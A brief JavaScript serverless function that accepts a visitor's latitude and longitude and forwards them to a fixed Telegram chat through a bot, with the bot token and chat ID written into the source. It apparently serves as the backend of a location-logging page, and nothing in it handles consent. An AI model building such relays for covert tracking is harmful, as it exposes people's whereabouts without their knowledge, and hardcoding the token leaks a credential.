export default async (req, res) => {
  const body = req.body;
  const token = '9016650193:AAHv_Iea7ZeUKiDbtXL910v5mfy5NSCHEsw';
  const chatId = 5396117701;

  if (req.method === 'POST' && body.latitude && body.longitude) {
    const latitude = body.latitude;
    const longitude = body.longitude;

    const response = await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        latitude: latitude,
        longitude: longitude
      })
    });

    return res.status(200).json({ status: 'ok', response: await response.json() });
  }

  return res.status(200).json({ status: 'ok' });
};
